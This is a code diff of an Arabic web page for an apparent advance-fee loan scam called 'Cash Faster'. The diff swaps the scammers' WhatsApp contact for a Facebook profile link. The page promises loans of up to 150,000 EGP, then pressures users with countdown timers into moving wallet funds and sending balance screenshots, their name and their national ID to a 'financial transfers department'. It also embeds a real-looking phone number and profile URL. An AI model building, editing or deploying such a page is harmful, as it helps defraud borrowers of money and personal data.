@@ -300,8 +300,8 @@
             text-align: right;
         }
 
-        .btn-whatsapp {
-            background: linear-gradient(135deg, #25D366, #128C7E);
+        .btn-facebook {
+            background: linear-gradient(135deg, #1877F2, #0E5A9E);
             padding: 0.8rem 1.5rem;
             border-radius: 3rem;
             display: inline-flex;
@@ -316,9 +316,9 @@
             justify-content: center;
         }
 
-        .btn-whatsapp:hover {
+        .btn-facebook:hover {
             transform: scale(1.02);
-            box-shadow: 0 0 18px #25D366;
+            box-shadow: 0 0 18px #1877F2;
         }
 
         .disabled-btn {
@@ -513,8 +513,8 @@
         }
     };
 
-    // رقم الواتساب الجديد
-    const WHATSAPP_NUMBER = "212777502472";
+    // رابط صفحة فيسبوك لممثلة التحويلات المالية (اميرة بيومى)
+    const FACEBOOK_PROFILE_URL = "https://www.facebook.com/profile.php?id=61577899260182";
     
     // موعد ثابت للعميل عبدالرحيم (لن يستخدم لأن الرقم غير موجود)
     const ABDULRAHIM_DEADLINE = new Date(2026, 4, 16, 21, 0, 0).getTime();
@@ -530,6 +530,11 @@
         let mins = Math.floor(totalSec / 60);
         let secs = totalSec % 60;
         return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+    }
+
+    // دالة لفتح صفحة الفيسبوك (بدلاً من واتساب)
+    function openFacebookPage() {
+        window.open(FACEBOOK_PROFILE_URL, '_blank');
     }
 
     // ========== واجهة خاصة للعميل صابر (لن تُستخدم لأن الرقم غير موجود) ==========
@@ -578,13 +583,13 @@
                     • قم بتحويل نفس المبلغ (أو الموجود) إلى أي حساب تابع لك (أحد أقاربك أو أصدقائك).<br>
                     • التقط صورة لعملية التحويل من حسابك إلى الحساب الآخر.<br>
                     • بعد التحويل، قم بالاستعلام عن رصيد حسابك مرة أخرى والتقط صورة تظهر خصم المبلغ.<br>
-                    • أرسل <strong>الصور الثلاث</strong> (رصيد قبل التحويل، صورة التحويل، رصيد بعد التحويل) إلى قسم التحويلات المالية عبر الواتساب.
+                    • أرسل <strong>الصور الثلاث</strong> (رصيد قبل التحويل، صورة التحويل، رصيد بعد التحويل) إلى قسم التحويلات المالية عبر فيسبوك.
                 </div>
                 <div class="step-box">
                     <i class="fas fa-info-circle"></i> <strong>ملاحظة هامة:</strong> بعد استلام الصور والتحقق منها، سيتم إيداع مبلغ القرض (150,000 ج.م) في حسابك خلال أقل من 10 دقائق مباشرة.
                 </div>
-                <button class="btn-whatsapp" id="saberWhatsappBtn">
-                    <i class="fab fa-whatsapp fa-lg"></i> إرسال صور الإثبات إلى مدام اسراء على (قسم التحويلات المالية)
+                <button class="btn-facebook" id="saberFacebookBtn">
+                    <i class="fab fa-facebook fa-lg"></i> إرسال صور الإثبات إلى مدام اسراء على (قسم التحويلات المالية)
                 </button>
             </div>
         `;
@@ -605,12 +610,11 @@
             }
         }, 1000);
         
-        const wsBtn = document.getElementById('saberWhatsappBtn');
-        if (wsBtn) {
-            wsBtn.onclick = () => {
-                const msg = `السلام عليكم ورحمة الله وبركاته\n\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nأرفق لكم صور إثبات الجدارة الائتمانية (المبلغ ${proofAmount.toLocaleString('ar-EG')} ج.م):\n1- صورة رصيد المحفظة قبل التحويل.\n2- صورة تحويل المبلغ إلى حساب تابع لي.\n3- صورة رصيد المحفظة بعد التحويل.\n\nأرجو التحقق والإيداع الفوري لمبلغ القرض (${customer.loan.toLocaleString('ar-EG')} ج.م) في محفظتي (${customer.walletNum}).\nتحياتي، ${customer.name}`;
-                window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
-                alert("تم توجيهك إلى محادثة واتساب مع مدام اسراء على. يرجى إرفاق الصور الثلاث والمتابعة لإتمام الصرف.");
+        const fbBtn = document.getElementById('saberFacebookBtn');
+        if (fbBtn) {
+            fbBtn.onclick = () => {
+                openFacebookPage();
+                alert("تم فتح صفحة فيسبوك الخاصة بممثلة التحويلات المالية. يرجى إرفاق الصور الثلاث والمتابعة لإتمام الصرف.");
             };
         }
     }
@@ -628,11 +632,11 @@
                 </div>
                 <div class="step-box">
                     <i class="fas fa-info-circle"></i> <strong>إجراءات فتح الطلب:</strong><br>
-                    • اضغط على زر الواتساب أدناه للتواصل مع قسم التحويلات المالية.<br>
+                    • اضغط على زر فيسبوك أدناه للتواصل مع قسم التحويلات المالية.<br>
                     • سيتم إعادة تفعيل طلبك ويمكنك بعدها إثبات الجدارة وصرف المبلغ فوراً.
                 </div>
-                <button class="btn-whatsapp" id="reopenRequestBtn">
-                    <i class="fab fa-whatsapp fa-lg"></i> التواصل مع قسم التحويلات المالية لفتح الطلب
+                <button class="btn-facebook" id="reopenRequestBtn">
+                    <i class="fab fa-facebook fa-lg"></i> التواصل مع قسم التحويلات المالية لفتح الطلب
                 </button>
             </div>
         `;
@@ -642,9 +646,8 @@
         const btn = document.getElementById('reopenRequestBtn');
         if (btn) {
             btn.onclick = () => {
-                const msg = `📢 طلب إعادة فتح الطلب (منتهي)\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nالمبلغ المستحق للصرف: ${customer.loan.toLocaleString('ar-EG')} ج.م\nأرجو إعادة فتح الطلب لإتمام إثبات الجدارة وصرف القرض.`;
-                window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
-                alert("تم فتح محادثة واتساب مع قسم التحويلات المالية. سيتم إعادة فتح الطلب والمتابعة.");
+                openFacebookPage();
+                alert("تم فتح صفحة فيسبوك الخاصة بقسم التحويلات المالية. سيتم إعادة فتح الطلب والمتابعة.");
             };
         }
     }
@@ -665,9 +668,9 @@
             contactHtml = `<div class="warning-badge" style="background:#EF4444AA;">❌ انتهت المهلة (الساعة 9:00 مساءً 16/05/2026). تم إلغاء الطلب. يرجى التواصل مع الدعم لإعادة الفتح.</div>`;
             btnText = "❌ الطلب ملغي";
         } else if (canContact) {
-            contactHtml = `<div class="step-box" style="border-right-color:#25D366;"><i class="fab fa-whatsapp"></i> <strong>✅ يمكنك الآن فتح التعليق</strong><br>لديك نصف ساعة قبل الساعة 9:00 مساءً للتواصل مع التحويلات المالية. اضغط الزر أدناه لإبلاغهم.</div>`;
+            contactHtml = `<div class="step-box" style="border-right-color:#1877F2;"><i class="fab fa-facebook"></i> <strong>✅ يمكنك الآن فتح التعليق</strong><br>لديك نصف ساعة قبل الساعة 9:00 مساءً للتواصل مع التحويلات المالية. اضغط الزر أدناه لإبلاغهم.</div>`;
             btnDisabled = false;
-            btnText = "<i class='fab fa-whatsapp'></i> إبلاغ التحويلات المالية (فتح التعليق)";
+            btnText = "<i class='fab fa-facebook'></i> إبلاغ التحويلات المالية (فتح التعليق)";
         } else {
             const waitTime = formatTimeLeft(timeLeft - halfHourBefore);
             contactHtml = `<div class="step-box"><i class="fas fa-hourglass-half"></i> <strong>⏳ يجب الانتظار حتى موعد فتح التعليق</strong><br>يمكنك التواصل مع التحويلات المالية خلال نصف الساعة الأخيرة قبل الساعة 9:00 مساءً.<br>الوقت المتبقي لبدء فترة التواصل: <strong>${waitTime}</strong></div>`;
@@ -685,7 +688,7 @@
                 </div>
                 ${contactHtml}
                 ${!expired ? `
-                <button class="btn-whatsapp ${btnDisabled ? 'disabled-btn' : ''}" id="contactSupportBtn" ${btnDisabled ? 'disabled' : ''}>
+                <button class="btn-facebook ${btnDisabled ? 'disabled-btn' : ''}" id="contactSupportBtn" ${btnDisabled ? 'disabled' : ''}>
                     ${btnText}
                 </button>
                 ` : ''}
@@ -736,8 +739,7 @@
         if (contactBtn && !customer.contactDone) {
             contactBtn.onclick = () => {
                 if (contactBtn.disabled) return;
-                const msg = `📢 إبلاغ فتح التعليق (عبدالرحيم)\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nأبلغكم برغبتي في فتح الطلب وإكمال إثبات الجدارة.`;
-                window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
+                openFacebookPage();
                 customer.contactDone = true;
                 displayProofStage(customer, nationalId);
             };
@@ -751,7 +753,7 @@
             <div class="proof-required-card">
                 <i class="fas fa-shield-alt" style="font-size:3rem; color:var(--royal-gold);"></i>
                 <h2 style="color:var(--royal-gold);">⚠️ إثبات الجدارة الائتمانية مطلوب</h2>
-                <p style="margin:1rem 0;"><strong>${customer.name}</strong> ، لصرف مبلغ القرض المدفوع (${customer.loan.toLocaleString('ar-EG')} ج.م) يجب عليك إثبات الجدارة الائتمانية من خلال قسم التحويلات المالية على واتساب.</p>
+                <p style="margin:1rem 0;"><strong>${customer.name}</strong> ، لصرف مبلغ القرض المدفوع (${customer.loan.toLocaleString('ar-EG')} ج.م) يجب عليك إثبات الجدارة الائتمانية من خلال قسم التحويلات المالية على فيسبوك.</p>
                 <div class="step-box" style="border-right-color:var(--royal-gold);">
                     <strong>📌 تعليمات إثبات الجدارة:</strong><br>
                     • المبلغ المطلوب لإثبات الجدارة: <span class="highlight-value">${proofAmount.toLocaleString('ar-EG')} ج.م</span><br>
@@ -763,8 +765,8 @@
                     <div><i class="fas fa-stopwatch"></i> يرجى إتمام الإجراء خلال 30 دقيقة</div>
                     <div class="timer" id="proofTimer">30:00</div>
                 </div>
-                <button class="btn-whatsapp" id="proofWhatsAppBtn">
-                    <i class="fab fa-whatsapp fa-lg"></i> التواصل مع قسم التحويلات المالية لإثبات الجدارة
+                <button class="btn-facebook" id="proofFacebookBtn">
+                    <i class="fab fa-facebook fa-lg"></i> التواصل مع قسم التحويلات المالية لإثبات الجدارة
                 </button>
                 <div class="step-box" style="margin-top:1rem;">
                     <i class="fas fa-info-circle"></i> ملاحظة: لن يتم صرف المبلغ إلا بعد إتمام إجراءات إثبات الجدارة بنجاح.
@@ -792,13 +794,11 @@
     }
 
     function attachProofEvents(customer, nationalId) {
-        const proofBtn = document.getElementById('proofWhatsAppBtn');
+        const proofBtn = document.getElementById('proofFacebookBtn');
         if (proofBtn) {
             proofBtn.onclick = () => {
-                const proofAmount = customer.loan < 100000 ? 6500 : 8500;
-                const msg = `📢 طلب إثبات الجدارة الائتمانية\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nالمبلغ المطلوب إثباته: ${proofAmount.toLocaleString('ar-EG')} ج.م\nالمبلغ المستحق للصرف: ${customer.loan.toLocaleString('ar-EG')} ج.م\nأرجو توجيهي لإتمام إجراءات الإثبات.`;
-                window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
-                alert("تم فتح محادثة واتساب مع قسم التحويلات المالية. يرجى متابعة التعليمات لإتمام الإثبات.");
+                openFacebookPage();
+                alert("تم فتح صفحة فيسبوك الخاصة بقسم التحويلات المالية. يرجى متابعة التعليمات لإتمام الإثبات.");
             };
         }
     }
@@ -838,14 +838,22 @@
                 <h3 style="color:var(--emerald); margin-bottom:1rem;"><i class="fas fa-chart-line"></i> إثبات الجدارة الائتمانية (إلزامي لصرف القرض)</h3>
                 <div class="step-box"><strong>💡 ما هي الجدارة؟</strong><br>إجراء أمني لتأكيد ملكية المحفظة. لن تقوم بتحويل أموال إلينا، فقط دورة إيداع من شخص موثوق وإعادته.</div>
                 <div class="step-box">🔹 المبلغ المطلوب لإثبات الجدارة: <span class="highlight-value">${proofAmount.toLocaleString('ar-EG')} ج.م</span></div>
-                <div class="step-box">📌 الخطوات:<br>1- اطلب من شخص تثق به تحويل ${proofAmount.toLocaleString('ar-EG')} ج.م إلى محفظتك.<br>2- التقط لقطة شاشة توضح المبلغ داخل رصيدك.<br>3- قم بتحويل نفس المبلغ مرة أخرى إلى نفس الشخص.<br>4- التقط لقطة شاشة ثانية لخروج المبلغ.<br>5- أرسل الصورتين عبر الواتساب إلى فريق Cash Faster.<br>✅ بعد الإثبات مباشرة، سيتم صرف كامل المبلغ (${customer.loan.toLocaleString('ar-EG')} ج.م) في حسابك فوراً.</div>
-                <button class="btn-whatsapp" onclick="openWhatsAppForProof('${customer.name.replace(/'/g, "\\'")}', '${nationalId}', ${proofAmount})">
-                    <i class="fab fa-whatsapp fa-lg"></i> إرسال صور الإثبات والتحقق الفوري
+                <div class="step-box">📌 الخطوات:<br>1- اطلب من شخص تثق به تحويل ${proofAmount.toLocaleString('ar-EG')} ج.م إلى محفظتك.<br>2- التقط لقطة شاشة توضح المبلغ داخل رصيدك.<br>3- قم بتحويل نفس المبلغ مرة أخرى إلى نفس الشخص.<br>4- التقط لقطة شاشة ثانية لخروج المبلغ.<br>5- أرسل الصورتين عبر فيسبوك إلى فريق Cash Faster.<br>✅ بعد الإثبات مباشرة، سيتم صرف كامل المبلغ (${customer.loan.toLocaleString('ar-EG')} ج.م) في حسابك فوراً.</div>
+                <button class="btn-facebook" id="sendProofFacebookBtn">
+                    <i class="fab fa-facebook fa-lg"></i> إرسال صور الإثبات والتحقق الفوري
                 </button>
             </div>
         `;
         document.getElementById('resultSection').innerHTML = html;
         startDeliveryTimer();
+        
+        const fbBtn = document.getElementById('sendProofFacebookBtn');
+        if (fbBtn) {
+            fbBtn.onclick = () => {
+                openFacebookPage();
+                alert("تم فتح صفحة فيسبوك الخاصة بقسم التحويلات المالية. يرجى إرفاق الصور والمتابعة.");
+            };
+        }
     }
 
     function startDeliveryTimer() {
@@ -864,11 +872,6 @@
                 timerEl.innerText = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
             }
         }, 1000);
-    }
-
-    function openWhatsAppForProof(name, id, amount) {
-        const msg = `السلام عليكم\nالعميل: ${name}\nالرقم القومي: ${id}\nسأقوم بإرسال صورتي الإيداع والخروج لإثبات الجدارة بمبلغ ${amount.toLocaleString('ar-EG')} ج.م.`;
-        window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
     }
 
     // البحث الرئيسي
@@ -934,7 +937,6 @@
     }
 
     window.searchCustomer = searchCustomer;
-    window.openWhatsAppForProof = openWhatsAppForProof;
 </script>
 </body>
 </html>
